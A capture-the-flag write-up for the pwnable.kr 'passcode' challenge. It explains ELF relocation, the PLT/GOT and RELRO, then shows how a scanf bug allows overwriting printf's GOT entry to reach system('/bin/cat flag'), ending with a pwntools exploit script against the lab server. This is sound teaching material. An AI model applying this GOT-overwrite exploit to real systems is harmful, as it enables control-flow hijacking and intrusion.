# passcode

## Description

passcode - 10 pt

> Mommy told me to make a passcode based login system. <br>
> My initial C code was compiled without any error! <br>
> Well, there was some compiler warning, but who cares about that? <br> <br>
> ssh passcode@pwnable.kr -p2222 (pw:guest)

## Solution

### Background

#### Statically and dynamically linked binaries

A binary can be either statically or dynamically linked. A statically linked binary is a self-contained executable that contains all the code and libraries it needs to run. A dynamically linked binary, on the other hand, uses the libraries that are installed on the system.

Most binaries are dynamically linked. This is because it is easier to update the libraries, and it is also more efficient. For example, if a program uses the `printf` function, it doesn't need to include the code for `printf` in the binary itself. Instead, it can use the `printf` function that is already installed on the system.

To locate the functions in the libraries, the binary needs to know the addresses of the functions. They couldn't simply be hard-coded, since the libraries update and with them the addresses change.

The lookup of the addresses and providing a mechanism to call them is called relocation. Most of the work is done by the linker.

#### Relocation

An ELF file is divided into sections. Each section contains a specific type of data, and some sections are used for relocation. Here are the interesting ones:

* `.got` - The Global Offset Table. This section contains the addresses of global variables.

* `.plt` - The Procedure Linkage Table. This section stubs that look up the addresses in the .got.plt section, and either jump to them, or call the linker to resolve them.

* `.got.plt` - The Global Offset Table for Procedure Linkage Table. This section contains the addresses of dynamically linked functions.

For example, let's take a look at the following disassembly:

```asm
0000000000400590 <puts@plt>:
400590:       ff 25 6a 0a 20 00       jmp    *0x200a6a(%rip)        # 601000 <puts@GLIBC_2.2.5>
400596:       68 00 00 00 00          push   $0x0
40059b:       e9 e0 ff ff ff          jmp    400580 <.plt>
```

The `puts@plt` stub is located in the `.plt` section. It's purpose is tho provide a mechanism to call the `puts` function. It does this by jumping to the address in the `.got.plt` section. 

When the program calls `puts` the first time, the matching `.got.plt` entry will be a call to the linker. The linker will resolve the address of the `puts` function, and update the `.got.plt` entry. The next time the program calls `puts`, it will jump directly to the address of the `puts` function. 

#### Using relocation for pwning

Most modern systems use NX (No eXecute) protection. This means that the memory pages that can be exectued can't be written. However, the `.got.plt` section is basically a table of addresses - and it is writable. This means that we can overwrite the addresses in the `.got.plt` section, and redirect the program to call our own code. 

#### Mitigations

The exploiting of the `.got.plt` section is a common technique, and most modern systems have mitigations against it. The most common mitigation is the `RELRO` protection - which stands for `RELocation Read-Only`.

If the binary is compiled with `Partial RELRO` then the `.got.plt` section is writable, but the `.got` section is not. If the binary is compiled with `Full RELRO` then both the `.got.plt` and the `.got` sections are not writable.

### Exploit

The given binary is dynamically linked, and compiled with `Partial RELRO`. This hints that in our exploit we will need to overwrite the `.got.plt` section.

Let's take a look at the source code:

```c
#include <stdio.h>
#include <stdlib.h>

void login(){
	int passcode1;
	int passcode2;

	printf("enter passcode1 : ");
	scanf("%d", passcode1);
	fflush(stdin);

	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
	printf("enter passcode2 : ");
	scanf("%d", passcode2);

	printf("checking...\n");
	if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
		exit(0);
        }
}

void welcome(){
	char name[100];
	printf("enter you name : ");
	scanf("%100s", name);
	printf("Welcome %s!\n", name);
}

int main(){
	printf("Toddler's Secure Login System 1.0 beta.\n");

	welcome();
	login();

	// something after login...
	printf("Now I can safely trust you that you have credential :)\n");
	return 0;	
}
```

The program first calls the `welcome()` function, where it saves `100` bytes of input on the stack. Then it calls the `login()` function, which reads 2 integers from the user. If the integers are equal to `338150` and `13371337` then the program prints the flag.

Following the hint in the description, we get the following warning when compiling the program:

```bash
warning: format ‘%d’ expects argument of type ‘int *’, but argument 2 has type ‘int’
```

This means that `scanf` is expecting to get the address of `passcode1` and `passcode2`, but instead gets their values.

So, if we chagne the value of `passcode1` to the address of a function in the `.got.plt` section, then we can redirect the program to the call `system("/bin/cat flag")`.

The key to this exploit is observing that both `welcome()` and `login()` will have the same base pointer when called. Therefore, some of the stack will be the same. We can use this to our advantage.

We will use the `welcome()` function save the address of `printf` in the `.got.plt` section inside the `passcode1` variable. Then, when scanf will be called in `login()`, we will enter the address of the call to `system("/bin/cat flag")`.

Here are the relevant parts of the disassembly:

```asm
08048564 <login>:
 ...
 80485e3:       c7 04 24 af 87 04 08    movl   $0x80487af,(%esp)
 80485ea:       e8 71 fe ff ff          call   8048460 <system@plt>
```

```asm
 08048420 <printf@plt>:
 8048420:       ff 25 00 a0 04 08       jmp    *0x804a000
 8048426:       68 00 00 00 00          push   $0x0
 804842b:       e9 e0 ff ff ff          jmp    8048410 <.plt>
```

So, the address of the pointer to `printf` in `.got.plt` is `0x804a000`, and the address of the call to `system("/bin/cat flag")` is `0x80485e3`.

As it truns out, with an offset of `96`, the input we enter will be stored in `passcode1`. Combining the two, we get the following exploit:

```python
from pwn import *

ssh = ssh(host='pwnable.kr', user='passcode', password='guest', port=2222)

p = ssh.process(executable='./passcode')

p.sendline('\x41' * 96 + '\x00\xa0\x04\x08' + '\n134514147')

p.interactive()
```

Note that we passed the second address as an integer because `scanf` uses `%d`.

